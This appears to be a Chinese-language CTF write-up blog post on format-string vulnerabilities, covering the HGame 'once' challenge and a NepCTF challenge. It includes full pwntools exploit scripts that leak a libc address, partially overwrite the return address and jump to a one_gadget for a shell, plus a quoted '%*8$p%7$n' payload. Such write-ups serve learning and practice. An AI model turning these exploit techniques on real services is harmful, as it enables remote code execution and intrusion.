---
title: Fmtstr
categories: 
    - Stack
    - Fmtstr
---
# Fmtstr
<!--more-->
## HGame week1

### once


![20210306191440](https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191440.png)


IDA看，明显是格式化字符串漏洞，显然是⽤来 leak （泄露地址） 的了，泄露出 libc 的地址，就能计算出 onegadget 的地址了，最后覆盖返回地址，使得返回到 onegadget 就能拿到 shell

但是这不能⼀次就完成，要分两步，第⼀次利⽤要先 leak，覆盖返回地址，返回到漏洞开始的地⽅（这里就是程序的 vuln 函数），第⼆次就覆盖返回地址成 onegadget 即可

在第⼀步呢，有⼀个关键点，地址随机化的最低 12 bit，是不会变的，所以只要覆盖最低的 1 个字节，就可以返回到其它相近的地⽅，⽐如 vuln 函数的开头，


我用[tag]的方法找字符串的偏移老找不准：


![20210306191649](https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191649.png)


如果想要找到栈中一些函数的地址来计算偏移的时候，不知道break在printf处后，栈中第一个值到底是第几个参数，所以我用了IDA去找。

test_exp:

```py
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'zsh', '-c']
context.log_level = 'debug'

p = remote('127.0.0.1',12345)

payload = 'AAAA'  + '%1$p' +'%2$p' +  '%3$p' +'%4$p' +  '%5$p'    + '%6$p'  + '%13$p'  + '%14$p'

p.sendafter('It is your turn: ',payload)
```

![20210307140046](https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140046.png)



![20210307140246](https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140246.png)


可以看到第13个参数是一个 libc_start_main 的地址，利用这个地址与题目给的 libc 文件就可以计算出 onegadget 

最后的 getshell 中 +0x4f3d5 用 one_gadget [libcname] 指令

![20210308133927](https://raw.githubusercontent.com/YTrick/image/branch/image/20210308133927.png)

exp：

```py
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'zsh', '-c']
context.log_level = 'info'

p = remote('182.92.108.71',30107)
#p = process('./once')
#p = remote('127.0.0.1',12345)

libc = ELF('./libc-2.27.so', checksec=False)
binary = ELF('./once', checksec=False)
payload = '%13$p\n'
payload = payload.ljust(0x28,'a')
payload +=   '\xD3' 
p.sendafter('It is your turn: ',payload)

libc_addr = p.recvuntil('\n','True')
libc_addr = int(libc_addr,16)
libc_base = libc_addr  - libc.symbols['__libc_start_main'] - 0xe7
print('libc_base',hex(libc_base))

getshell = 'a' *0x28
getshell += p64(libc_base + 0x4f3d5)

p.recvuntil('It is your turn: ')
p.sendline(getshell)

p.interactive()
```




## NepCTF （未解决）

### scmt

2021.3.25

找不到点

官方writeup
```py
from pwn import *

context.log_level = 'debug'

p= process("./scmt")

#p=remote("node2.hackingfor.fun",39232)

#p = remote('127.0.0.1',12345)

payload = '%*8$p%7$n'

p.sendlineafter('tell me your name:',payload)

p.sendafter(' number:','-')

p.interactive()
```




